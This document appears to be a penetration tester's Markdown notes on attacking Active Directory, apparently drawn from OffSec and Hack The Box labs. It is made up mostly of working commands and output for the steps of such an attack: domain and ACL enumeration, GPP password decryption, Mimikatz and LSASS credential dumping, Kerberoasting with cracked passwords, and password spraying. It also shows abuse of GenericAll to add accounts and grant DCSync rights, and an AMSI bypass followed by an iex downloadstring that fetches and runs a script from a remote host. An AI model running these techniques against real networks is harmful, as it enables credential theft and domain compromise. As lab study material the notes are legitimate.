# Active Directory

## whoEnumeration

### Traditional approach

```
net user /domain ###enumerate all users in the entire domain
net user jeff_admin /domain
net group /domain
net group "Sales Department" /domain
```

### **Modern approach**

```
// SoPS C:\Users\offsec.CORP> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent
Domain()
Forest : corp.com
DomainControllers : {DC01.corp.com}
Children : {}
DomainMode : Unknown
DomainModeLevel : 7
Parent :
PdcRoleOwner : DC01.corp.com
RidRoleOwner : DC01.corp.com
InfrastructureRoleOwner : DC01.corp.com
Name : corp.com
```

{% code title="Enable running scripts" overflow="wrap" lineNumbers="true" %}
```
powershell -ep bypass
```
{% endcode %}

{% code title="Script which will create the full LDAP path required for enumeration" overflow="wrap" lineNumbers="true" %}
```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```
{% endcode %}

{% code title="Script output showing the full LDAP path" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\stephanie> .\enumeration.ps1
LDAP://DC1.corp.com/DC=corp,DC=com
```
{% endcode %}

0x30000000 (decimal 805306368) to the filter property to enumerate all users in the domain

{% code title=".\enumerate.ps1" overflow="wrap" lineNumbers="true" %}
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}

```
{% endcode %}

#### Resoving Nested Groups

```
domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=Secret_Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.member
}
```

While Microsoft has not documented a list of searchable SPN’s there are extensive lists available online.

```
update previously script with this filter
$Searcher.filter="serviceprincipalname=*http*"
```

## **PowerView**

```
PS C:\Tools\active_directory> Import-Module .\PowerView.ps1
```

```
Get-NetDomain
Get-NetUser
Get-NetUser "fred"
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetUser | select cn,whencreated
Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member
```

{% code title="Currently logged on users" overflow="wrap" lineNumbers="true" %}
```
PS C:\Tools\active_directory> Get-NetLoggedon -ComputerName client251
```
{% endcode %}

{% code title="Get-NetSession will return all active sessions, in our case from the domain controller" overflow="wrap" lineNumbers="true" %}
```
PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01
```
{% endcode %}

### **Enumerating Operating Systems**

<pre><code>Get-NetComputer
<strong>Get-NetComputer | select operatingsystem,dnshostname
</strong></code></pre>

### **Permissions and Logged on Users**

```
Find-LocalAdminAccess
Get-NetSession -ComputerName files04
Get-NetSession -ComputerName files04 -Verbose
PS C:\Tools> Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```

### **Enumerate through Service Principal Names**



```
setspn -L iis_service
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### **Enumerating Object Permissions**

AD permission types

{% hint style="info" %}
GenericAll: Full permissions on object \
GenericWrite: Edit certain attributes on the object \
WriteOwner: Change ownership of the object \
WriteDACL: Edit ACE's applied to object \
AllExtendedRights: Change password, reset password, etc. \
ForceChangePassword: Password change for object \
Self (Self-Membership): Add ourselves to for example a group
{% endhint %}

{% code title=" Running Get-ObjectAcl specifying our user" overflow="wrap" lineNumbers="true" %}
```
PS C:\Tools> Get-ObjectAcl -Identity stephanie

...
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
ActiveDirectoryRights  : ReadProperty
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 4c164200-20c0-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 16
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AceType                : AccessAllowedObject
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None
...
```
{% endcode %}

```
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie
```

{% code title="Enumerating ACLs for the Management Group" overflow="wrap" lineNumbers="true" %}
```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

```
{% endcode %}

{% code title="Enumerate interesting ACLs" overflow="wrap" lineNumbers="true" %}
```
Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft
```
{% endcode %}

{% code title="Change a user password where you have GenericALL rights" overflow="wrap" lineNumbers="true" %}
```
net user robert Password123! /domain 
```
{% endcode %}

{% code title="" overflow="wrap" lineNumbers="true" %}
```
PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
CORP\Domain Admins
CORP\stephanie
BUILTIN\Account Operators
Local System
CORP\Enterprise Admins
```
{% endcode %}

### **Enumerating Domain Shares**

{% code title="" overflow="wrap" lineNumbers="true" %}
```
Find-DomainShare
ls \\dc1.corp.com\sysvol\corp.com\
ls \\dc1.corp.com\sysvol\corp.com\Policies\
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
ls \\FILES04\docshare
ls \\FILES04\docshare\docs\do-not-share
ls "\\files04.corp.com\Important Files\"
```
{% endcode %}

{% code title="" overflow="wrap" lineNumbers="true" %}
```
PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
          name="Administrator (built-in)"
          image="2"
          changed="2012-05-03 11:45:20"
          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
    <Properties
          action="U"
          newName=""
          fullName="admin"
          description="Change local admin"
          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
          changeLogon="0"
          noChange="0"
          neverExpires="0"
          acctDisabled="0"
          userName="Administrator (built-in)"
          expires="2016-02-10" />
  </User>
</Groups>
```
{% endcode %}

{% code title="Using gpp-decrypt to decrypt the password" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
P@$$w0rd
```
{% endcode %}

## **Authentication**

1. **NTLM**
2. **Kerberos**
3. **Cached Credential Storage and Retrieval**
   1. execute Mimikatz directly from memory using an injector like PowerShell (https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke- ReflectivePEInjection.ps1)or use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and from there, load the data into Mimikatz.
4.  Service Account Attacks

    1. Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'H TTP/CorpWebServer.corp.com'
    2. PS C:\Users\offsec.CORP> klist
    3. mimikatz # kerberos::list /export


5. Low and Slow Password Guessing
   1. PS C:\Users\Offsec.corp> net accountss
   2. Spray-Passwords.ps ([ https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1](https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1))



### Kerberoasting

```
kali@kali:~$ sudo apt update && sudo apt install kerberoast
...
kali@kali:~$ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offse
c@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
found password for ticket 0: Qwerty09! File: 1-40a50000-Offsec@HTTP~CorpWebServer.cor
p.com-CORP.COM.kirbi
All tickets cracked!
```

{% hint style="info" %}
The Invoke-Kerberoast.ps**1** [ **https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/Invoke-**\
**Kerberoast.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/Invoke-Kerberoast.ps1)**)** script extends this attack, and can automatically enumerate all service principal names in the domain, request service tickets for them, and export them in a format ready for cracking in both John the Ripper and Hashcat, completely eliminating the need for Mimikatz in this attack.
{% endhint %}

### Making use of "GenericAll"

```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net user john abc123! /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net group "Exchange Windows Permissions" john /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net localgroup "Remote Management Users" john /add
The command completed successfully.

```

### Download PowerView

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Bypass-4MSI
[+] Success!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> iex(new-object net.webclient).downloadstring("http://10.10.16.12:8080/PowerView.ps1")

```

The Bypass-4MSI command is used to evade defender before importing the script. Next, we can use the Add-ObjectACL with john's credentials, and give him DCSync rights.



```
$SecPassword = ConvertTo-SecureString 'abc123!!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\john', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
```

##

```
```

